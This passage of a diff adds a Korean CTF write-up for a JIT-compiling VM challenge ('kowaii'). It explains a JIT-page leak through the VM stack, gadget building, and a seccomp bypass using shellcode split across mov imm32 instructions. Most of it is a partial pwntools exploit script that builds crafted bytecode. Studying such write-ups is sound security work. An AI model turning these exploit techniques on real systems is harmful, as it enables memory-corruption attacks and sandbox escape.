+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;pop rcx;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;pop rdx;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;pop rdi;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;pop r15;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;pop r14;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;pop r13;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;pop r12;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;pop r11;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;pop r10;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;pop r9;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;pop r8;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;pop rbp;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;ret&#34;</span>
+</span></span><span style="display:flex;"><span>            );
+</span></span><span style="display:flex;"><span>        }
+</span></span></code></pre></div><p>근본적으로 call 함수에서 rsp에 직접 vm 스택의 주소가 담기고, 실제로 push / pop / call 을 수행할 수 있다면 JIT page도 릭할 수 있다.<br>
+JIT compile된 함수는 이미 JIT compile된 함수만 call이 가능하다.<br>
+call 이전에 이미 rsp는 vm stack의 주소로 변경되었으니 이를 이용해 JIT page leak이 가능하다.<br>
+그리고 pop ret 가젯을 만들고 push ret 가젯을 만들어서 pop으로 binary base를 구하고 push ret으로 context 복구가 가능하다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">#ifdef SECCOMP
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">kowaiiSeccomp</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    scmp_filter_ctx sctx;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    sctx <span style="color:#f92672">=</span> seccomp_init(SCMP_ACT_KILL);
+</span></span><span style="display:flex;"><span>    seccomp_rule_add(sctx, SCMP_ACT_ALLOW, SCMP_SYS(mprotect), <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    seccomp_rule_add(sctx, SCMP_ACT_ALLOW, SCMP_SYS(lseek), <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    seccomp_rule_add(sctx, SCMP_ACT_ALLOW, SCMP_SYS(open), <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    seccomp_rule_add(sctx, SCMP_ACT_ALLOW, SCMP_SYS(openat), <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    seccomp_rule_add(sctx, SCMP_ACT_ALLOW, SCMP_SYS(read), <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    seccomp_rule_add(sctx, SCMP_ACT_ALLOW, SCMP_SYS(write), <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    seccomp_rule_add(sctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    seccomp_rule_add(sctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[*] Applying seccomp filetrs, no escape ;)&#34;</span> <span style="color:#f92672">&lt;&lt;</span> endl;
+</span></span><span style="display:flex;"><span>    close(STDIN_FILENO);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(seccomp_load(sctx)) error(<span style="color:#e6db74">&#34;Seccomp error :^(&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
+</span></span></span></code></pre></div><p>seccomp bypass를 위해서 JIT에 mov imm32를 통해서 4바이트씩 쉘코드를 작성하고 \xeb\x02로 쉘코드를 이었다.</p>
+<h2 id="exploit-1">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-1">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">COMPILER</span>:
+</span></span><span style="display:flex;"><span>    ADD               <span style="color:#f92672">=</span><span style="color:#ae81ff">0xb0</span>
+</span></span><span style="display:flex;"><span>    SUB               <span style="color:#f92672">=</span><span style="color:#ae81ff">0xb1</span>
+</span></span><span style="display:flex;"><span>    MUL               <span style="color:#f92672">=</span><span style="color:#ae81ff">0xb2</span>
+</span></span><span style="display:flex;"><span>    SHR               <span style="color:#f92672">=</span><span style="color:#ae81ff">0xb3</span>
+</span></span><span style="display:flex;"><span>    SHL               <span style="color:#f92672">=</span><span style="color:#ae81ff">0xb4</span>
+</span></span><span style="display:flex;"><span>    PUSH              <span style="color:#f92672">=</span><span style="color:#ae81ff">0xb5</span>
+</span></span><span style="display:flex;"><span>    POP               <span style="color:#f92672">=</span><span style="color:#ae81ff">0xb6</span>
+</span></span><span style="display:flex;"><span>    GET               <span style="color:#f92672">=</span><span style="color:#ae81ff">0xb7</span>
+</span></span><span style="display:flex;"><span>    SET               <span style="color:#f92672">=</span><span style="color:#ae81ff">0xb8</span>
+</span></span><span style="display:flex;"><span>    MOV               <span style="color:#f92672">=</span><span style="color:#ae81ff">0xb9</span>
+</span></span><span style="display:flex;"><span>    CALL              <span style="color:#f92672">=</span><span style="color:#ae81ff">0xba</span>
+</span></span><span style="display:flex;"><span>    RET               <span style="color:#f92672">=</span><span style="color:#ae81ff">0xbb</span>
+</span></span><span style="display:flex;"><span>    NOP               <span style="color:#f92672">=</span><span style="color:#ae81ff">0xbc</span>
+</span></span><span style="display:flex;"><span>    HLT               <span style="color:#f92672">=</span><span style="color:#ae81ff">0xbf</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@staticmethod</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(dst, src1, src2):
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p8(compiler<span style="color:#f92672">.</span>ADD)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p8(dst)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p8(src1)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p8(src2)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> payload
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@staticmethod</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sub</span>(dst, src1, src2):
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p8(compiler<span style="color:#f92672">.</span>SUB)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p8(dst)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p8(src1)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p8(src2)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> payload
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@staticmethod</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">mov</span>(dst, imm32):
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p8(compiler<span style="color:#f92672">.</span>MOV)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p8(dst)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(imm32)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> payload
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@staticmethod</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">shl</span>(dst, imm8):
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p8(compiler<span style="color:#f92672">.</span>SHL)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p8(dst)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p8(imm8)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> payload
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@staticmethod</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get</span>(dst,imm32):
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p8(compiler<span style="color:#f92672">.</span>GET)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p8(dst)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(imm32) 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> payload
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@staticmethod</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">set</span>(src,imm32):
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p8(compiler<span style="color:#f92672">.</span>SET)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p8(src)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(imm32)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> payload
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@staticmethod</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">call</span>(hash):
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p8(compiler<span style="color:#f92672">.</span>CALL)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p16(hash)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> payload
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@staticmethod</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ret</span>():
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p8(compiler<span style="color:#f92672">.</span>RET)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> payload
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@staticmethod</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hlt</span>():
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p8(compiler<span style="color:#f92672">.</span>HLT)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> payload
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@staticmethod</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">push</span>(reg):
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p8(compiler<span style="color:#f92672">.</span>PUSH)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p8(reg)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> payload
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@staticmethod</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pop</span>(reg):
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p8(compiler<span style="color:#f92672">.</span>POP)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p8(reg)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> payload
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@staticmethod</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">nop</span>():
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p8(compiler<span style="color:#f92672">.</span>NOP)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> payload
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@staticmethod</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">shl</span>(dst, imm8):
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p8(compiler<span style="color:#f92672">.</span>SHL)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p8(dst)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p8(imm8)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> payload
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">KOWAII</span>:
+</span></span><span style="display:flex;"><span>    CODE_START <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, bss):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>funcs <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">assert</span> bss <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0xc000</span>
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>bss <span style="color:#f92672">=</span> bss
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>entry <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>code <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>bss_data <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">set_main</span>(self,code):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>entry <span style="color:#f92672">=</span> len(self<span style="color:#f92672">.</span>code) <span style="color:#f92672">+</span> KOWAII<span style="color:#f92672">.</span>CODE_START
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>code <span style="color:#f92672">+=</span> code
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add_func</span>(self, code, addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>, sz <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">assert</span> len(self<span style="color:#f92672">.</span>funcs) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0x80</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> addr <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xdeadbeef</span>:
+</span></span><span style="display:flex;"><span>            addr <span style="color:#f92672">=</span> len(self<span style="color:#f92672">.</span>code)<span style="color:#f92672">+</span>KOWAII<span style="color:#f92672">.</span>CODE_START
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> sz <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xdeadbeef</span>:
+</span></span><span style="display:flex;"><span>            sz <span style="color:#f92672">=</span> len(code)
+</span></span><span style="display:flex;"><span>        f <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;hash&#39;</span> : len(self<span style="color:#f92672">.</span>funcs),
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;addr&#39;</span> : addr,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;size&#39;</span> : sz,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;callCount&#39;</span> : <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>code <span style="color:#f92672">+=</span> code
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>funcs<span style="color:#f92672">.</span>append(f) 
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_binary</span>(self):
+</span></span><span style="display:flex;"><span>        binary <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;KOWAII&#39;</span>
+</span></span><span style="display:flex;"><span>        binary <span style="color:#f92672">+=</span> p16(self<span style="color:#f92672">.</span>entry)
+</span></span><span style="display:flex;"><span>        binary <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadc0de</span>)
+</span></span><span style="display:flex;"><span>        binary <span style="color:#f92672">+=</span> p16(self<span style="color:#f92672">.</span>bss)
+</span></span><span style="display:flex;"><span>        binary <span style="color:#f92672">+=</span> p8(len(self<span style="color:#f92672">.</span>funcs))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>funcs:
+</span></span><span style="display:flex;"><span>            binary <span style="color:#f92672">+=</span> p16(i[<span style="color:#e6db74">&#39;hash&#39;</span>])
+</span></span><span style="display:flex;"><span>            binary <span style="color:#f92672">+=</span> p64(i[<span style="color:#e6db74">&#39;addr&#39;</span>])
+</span></span><span style="display:flex;"><span>            binary <span style="color:#f92672">+=</span> p8(i[<span style="color:#e6db74">&#39;size&#39;</span>])
+</span></span><span style="display:flex;"><span>            binary <span style="color:#f92672">+=</span> p8(i[<span style="color:#e6db74">&#39;callCount&#39;</span>])
+</span></span><span style="display:flex;"><span>        binary <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> (KOWAII<span style="color:#f92672">.</span>CODE_START<span style="color:#f92672">-</span>len(binary)) 
+</span></span><span style="display:flex;"><span>        binary <span style="color:#f92672">+=</span> self<span style="color:#f92672">.</span>code
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(self<span style="color:#f92672">.</span>bss_data) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>            binary <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> (self<span style="color:#f92672">.</span>bss <span style="color:#f92672">-</span> len(binary))
+</span></span><span style="display:flex;"><span>            binary <span style="color:#f92672">+=</span> self<span style="color:#f92672">.</span>bss_data
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> binary  
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_func</span>(self, idx): 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>funcs[idx]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">set_bss_data</span>(self, data):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>bss_data <span style="color:#f92672">=</span> data
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    r0,r1,r2,r3,r4,r5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    kowaii <span style="color:#f92672">=</span> KOWAII(bss<span style="color:#f92672">=</span><span style="color:#ae81ff">0xc000</span>)
+</span></span><span style="display:flex;"><span>    compiler <span style="color:#f92672">=</span> COMPILER()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    pop_func <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>  <span style="color:#75715e"># JIT_MS = 0xa</span>
+</span></span><span style="display:flex;"><span>    pop_func <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>pop(r0) 
+</span></span><span style="display:flex;"><span>    pop_func <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>nop() <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x10</span>
+</span></span><span style="display:flex;"><span>    pop_func <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>ret()
+</span></span><span style="display:flex;"><span>    popf <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    get_pc <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>  <span style="color:#75715e"># will not be optimized</span>
+</span></span><span style="display:flex;"><span>    get_pc <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>pop(r0)
+</span></span><span style="display:flex;"><span>    get_pc <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>set(r0, <span style="color:#ae81ff">0xf00</span>)
+</span></span><span style="display:flex;"><span>    get_pc <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>push(r0)
+</span></span><span style="display:flex;"><span>    get_pc <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>ret()
+</span></span><span style="display:flex;"><span>    get_pcf <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    kowaii<span style="color:#f92672">.</span>add_func(pop_func)
+</span></span><span style="display:flex;"><span>    kowaii<span style="color:#f92672">.</span>add_func(get_pc)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">optimize</span>(func, additional_code_perloop <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>,additional_code_perloop1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span> ,JIT_CC <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xa</span>, JIT_MS <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xa</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">assert</span> kowaii<span style="color:#f92672">.</span>get_func(func)[<span style="color:#e6db74">&#39;size&#39;</span>] <span style="color:#f92672">&gt;=</span> JIT_MS
+</span></span><span style="display:flex;"><span>        code <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>        code <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>call(get_pcf)
+</span></span><span style="display:flex;"><span>        code <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>get(r5, <span style="color:#ae81ff">0xf00</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> it <span style="color:#f92672">in</span> range(JIT_CC):
+</span></span><span style="display:flex;"><span>            code <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>mov(r1, <span style="color:#ae81ff">6</span><span style="color:#f92672">+</span>(<span style="color:#ae81ff">13</span><span style="color:#f92672">+</span>len(additional_code_perloop<span style="color:#f92672">+</span>additional_code_perloop1))<span style="color:#f92672">*</span>(it<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>))
+</span></span><span style="display:flex;"><span>            code <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>add(r1,r5,r1)
+</span></span><span style="display:flex;"><span>            code <span style="color:#f92672">+=</span> additional_code_perloop
+</span></span><span style="display:flex;"><span>            code <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>call(func)
+</span></span><span style="display:flex;"><span>            code <span style="color:#f92672">+=</span> additional_code_perloop1
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> code
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    - vmpc &amp; r0 ~ r5 can be controlled
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    - rip &amp; rax, cl, rdx, r10 ~ r15 can be controlled
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    - writable bss can be controlled
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 1) Leak JIT page</span>
+</span></span><span style="display:flex;"><span>    jit_leak <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>    jit_leak <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>nop() <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x10</span>
+</span></span><span style="display:flex;"><span>    jit_leak <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>call(popf)
+</span></span><span style="display:flex;"><span>    jit_leak <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>ret()
+</span></span><span style="display:flex;"><span>    jit_leakf <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>    kowaii<span style="color:#f92672">.</span>add_func(jit_leak)
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    main <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
